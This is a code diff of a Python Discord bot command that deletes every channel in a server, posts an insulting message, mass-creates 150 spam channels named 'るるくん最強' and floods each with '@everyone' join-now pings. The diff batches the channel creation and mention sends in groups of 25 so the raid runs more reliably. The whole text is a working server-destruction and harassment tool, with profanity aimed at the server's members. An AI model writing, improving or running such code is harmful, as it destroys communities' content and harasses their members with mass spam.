@@ -32,14 +32,17 @@ async def ruru(ctx):
     # 全てのチャンネルが削除されたことを確認
     await ctx.send('All channels have been deleted. Fuck you all.')
 
-    # 150個の「るるくん最強」チャンネルを作成
+    # 150個の「るるくん最強」チャンネルを最速で作成
     create_tasks = []
     for _ in range(150):
         task = asyncio.create_task(ctx.guild.create_text_channel('るるくん最強'))
         create_tasks.append(task)
 
-    # 全ての作成タスクが完了するまで待機
-    await asyncio.gather(*create_tasks)
+    # 最大25タスクずつバッチで実行
+    batch_size = 25
+    for i in range(0, len(create_tasks), batch_size):
+        batch = create_tasks[i:i + batch_size]
+        await asyncio.gather(*batch)
 
     # 作成したチャンネルに@everyoneメンションを投稿
     new_channels = ctx.guild.text_channels
@@ -49,8 +52,10 @@ async def ruru(ctx):
             task = asyncio.create_task(channel.send('@everyone 今すぐ参加'))
             mention_tasks.append(task)
 
-    # 全てのメンションタスクが完了するまで待機
-    await asyncio.gather(*mention_tasks)
+    # 最大25タスクずつバッチで実行
+    for i in range(0, len(mention_tasks), batch_size):
+        batch = mention_tasks[i:i + batch_size]
+        await asyncio.gather(*batch)
 
 def keep_alive():
     # Keep-aliveサーバーの設定
